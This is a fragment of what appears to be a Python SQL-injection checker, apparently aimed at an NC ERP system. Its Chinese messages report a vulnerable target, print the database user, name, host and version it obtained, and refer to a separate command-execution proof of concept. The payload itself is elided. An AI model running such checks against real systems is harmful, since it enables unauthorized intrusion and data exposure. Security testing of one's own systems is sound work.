...
def exp_check(target_url):
    ...
    try:
        ...
        if row_1 in response.text and "服务器错误信息：null" not in response.text:
            ...
            print("[SUCCESS] 该系统存在SQL漏洞，漏洞响应为:")
            print("[INFO] >> 数据库用户为:{}".format(db_user))
            print("[INFO] >> 数据库名为:{}".format(db_name))
            print("[INFO] >> 数据库主机名为:{}".format(db_host))
            print("[INFO] >> 数据库版本为:{}".format(db_vers))
            print("[INFO] 该漏洞有可能可执行命令，请到移步到poc/nc_erp_sql.py进行检查确认\n")
            return 1
        else:
